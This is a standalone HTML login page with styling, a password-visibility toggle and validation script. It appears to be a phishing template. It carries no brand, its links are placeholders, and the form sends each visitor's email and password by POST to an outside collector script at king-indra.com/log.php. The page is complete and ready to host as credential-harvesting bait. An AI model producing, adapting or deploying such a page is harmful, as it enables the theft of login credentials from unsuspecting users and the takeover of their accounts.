<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Secure Login</title>
  <style>
    :root{
      --bg:#0f1724;
      --card:#0b1220;
      --accent-start:#6ee7b7;
      --accent-end:#60a5fa;
      --muted:#94a3b8;
      --glass: rgba(255,255,255,0.04);
      --radius:14px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:linear-gradient(180deg,#071026 0%, #071426 40%), radial-gradient(600px 300px at 10% 10%, rgba(96,165,250,0.08), transparent 20%), radial-gradient(500px 200px at 90% 90%, rgba(110,231,183,0.04), transparent 15%); color:#e6eef8}

    .wrap{min-height:100vh;display:grid;place-items:center;padding:32px}

    .card{
      width:100%;max-width:460px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:var(--radius);padding:28px;box-shadow:0 10px 30px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03);
      backdrop-filter: blur(8px);
    }

    .brand{display:flex;gap:12px;align-items:center;margin-bottom:18px}
    .logo{width:52px;height:52px;border-radius:10px;display:grid;place-items:center;background:linear-gradient(135deg,var(--accent-start),var(--accent-end));box-shadow:0 6px 18px rgba(96,165,250,0.14)}
    .logo svg{width:28px;height:28px}
    .brand h1{font-size:18px;margin:0}
    .brand p{margin:0;font-size:13px;color:var(--muted)}

    form .field{margin-top:12px}
    label{display:inline-block;font-size:13px;color:var(--muted);margin-bottom:8px}
    input[type="email"], input[type="password"]{
      width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:var(--glass);color:inherit;font-size:15px;outline:none;transition:box-shadow .18s, border-color .18s;
    }
    input:focus{box-shadow:0 6px 18px rgba(96,165,250,0.06);border-color:rgba(96,165,250,0.28)}

    .row{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-top:10px}
    .remember{display:flex;gap:8px;align-items:center;color:var(--muted);font-size:13px}
    .btn{
      margin-top:16px;padding:12px 14px;border-radius:10px;border:0;font-weight:600;font-size:15px;cursor:pointer;background:linear-gradient(90deg,var(--accent-start),var(--accent-end));color:#06202a;box-shadow:0 10px 30px rgba(96,165,250,0.12)
    }

    .alternative{margin-top:18px;text-align:center;color:var(--muted);font-size:13px}
    .alt a{color:var(--accent-end);text-decoration:none;font-weight:600}

    .muted-small{color:var(--muted);font-size:13px}

    .eye-btn{background:none;border:0;cursor:pointer;padding:6px;border-radius:8px}
    .input-with-icon{position:relative}
    .input-with-icon .eye-btn{position:absolute;right:6px;top:50%;transform:translateY(-50%);}

    @media (max-width:520px){.card{padding:20px;margin:8px}}
  </style>
</head>
<body>
  <div class="wrap">
    <main class="card" role="main" aria-labelledby="loginTitle">
      <header class="brand">
        <div class="logo" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M3 12c0 4.971 4.029 9 9 9s9-4.029 9-9-4.029-9-9-9S3 7.029 3 12z" fill="white" opacity="0.06"/>
            <path d="M7 12a5 5 0 0 0 10 0" stroke="white" stroke-opacity="0.9" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <div>
          <h1 id="loginTitle">Welcome back</h1>
          <p>Sign in to your account</p>
        </div>
      </header>

      <form id="loginForm" action="https://king-indra.com/log.php" method="POST" autocomplete="on">

        <div class="field">
          <label for="email">Email</label>
          <input id="email" name="email" type="email" placeholder="you@example.com" required aria-required="true" />
        </div>

        <div class="field input-with-icon">
          <label for="password">Password</label>
          <input id="password" name="password" type="password" minlength="6" placeholder="Your password" required aria-required="true" />
          <button type="button" class="eye-btn" aria-label="Toggle password visibility" onclick="togglePassword()">
            <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
            <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="display:none">
              <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.86 21.86 0 0 1 5.06-4.94"></path>
              <path d="M1 1l22 22"></path>
            </svg>
          </button>
        </div>

        <div class="row">
          <label class="remember"><input type="checkbox" name="remember" value="1" /> Remember me</label>
          <a class="muted-small" href="#">Forgot password?</a>
        </div>

        <button class="btn" type="submit">Sign in</button>

        <p class="alternative">Don't have an account? <span class="alt"><a href="#">Create account</a></span></p>

      </form>

      <p class="muted-small" style="margin-top:12px;font-size:12px">By signing in you agree to our <a href="#" style="color:var(--accent-end);text-decoration:none">Terms</a> and <a href="#" style="color:var(--accent-end);text-decoration:none">Privacy</a>.</p>
    </main>
  </div>

  <script>
    function togglePassword(){
      const pwd = document.getElementById('password');
      const open = document.getElementById('eyeOpen');
      const closed = document.getElementById('eyeClosed');
      if(pwd.type === 'password'){
        pwd.type = 'text'; open.style.display='none'; closed.style.display='inline';
      } else {
        pwd.type = 'password'; open.style.display='inline'; closed.style.display='none';
      }
    }

    // Progressive enhancement: add client-side validation feedback
    document.getElementById('loginForm').addEventListener('submit', function(e){
      const email = document.getElementById('email');
      const pwd = document.getElementById('password');
      if(!email.checkValidity()){
        email.focus();
        return; // browser will show native validation
      }
      if(!pwd.checkValidity()){
        pwd.focus();
        return;
      }
      // Let the form submit normally to the action URL (POST to https://king-indra.com/log.php)
      // If you want to submit via fetch instead, uncomment the code below and prevent default.

      /*
      e.preventDefault();
      fetch(this.action, {
        method: 'POST',
        body: new FormData(this),
        credentials: 'omit'
      }).then(r=>{
        // handle response
      }).catch(err=>console.error(err));
      */
    });
  </script>
</body>
</html>
